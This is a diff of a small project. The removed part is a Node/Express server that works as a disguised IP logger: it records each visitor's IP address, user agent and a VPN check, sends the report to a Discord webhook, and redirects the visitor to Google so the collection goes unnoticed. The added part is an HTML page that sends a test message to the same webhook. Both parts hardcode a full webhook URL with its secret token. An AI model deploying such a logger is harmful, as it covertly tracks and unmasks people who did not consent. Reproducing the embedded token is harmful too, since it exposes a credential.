@@ -1,60 +1,18 @@
-const express = require("express");
-const fetch = require("node-fetch");
-
-const app = express();
-
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l";
-const REDIRECT_URL = "https://google.com";
-
-app.get("/", async (req, res) => {
-    const ip =
-        req.headers["cf-connecting-ip"] ||
-        req.headers["x-forwarded-for"]?.split(",")[0] ||
-        req.socket.remoteAddress;
-
-    const userAgent = req.headers["user-agent"] || "Unknown";
-
-    let vpnData = {};
-
-    try {
-        const response = await fetch(
-            `https://proxycheck.io/v2/${ip}?vpn=1&risk=1`
-        );
-
-        vpnData = await response.json();
-    } catch {
-        vpnData = {
-            error: "VPN check failed"
-        };
-    }
-
-    const report = {
-        ip,
-        userAgent,
-        timestamp: new Date().toISOString(),
-        vpnCheck: vpnData
-    };
-
-    try {
-        await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                content:
-                    "```json\n" +
-                    JSON.stringify(report, null, 2) +
-                    "\n```"
-            })
-        });
-    } catch (err) {
-        console.error(err);
-    }
-
-    res.redirect(REDIRECT_URL);
-});
-
-app.listen(3000, () => {
-    console.log("Server läuft auf Port 3000");
-});
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch("https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        content: "Webhook funktioniert!"
+    })
+})
+.then(r => console.log(r.status))
+.catch(console.error);
+</script>
+</body>
+</html>
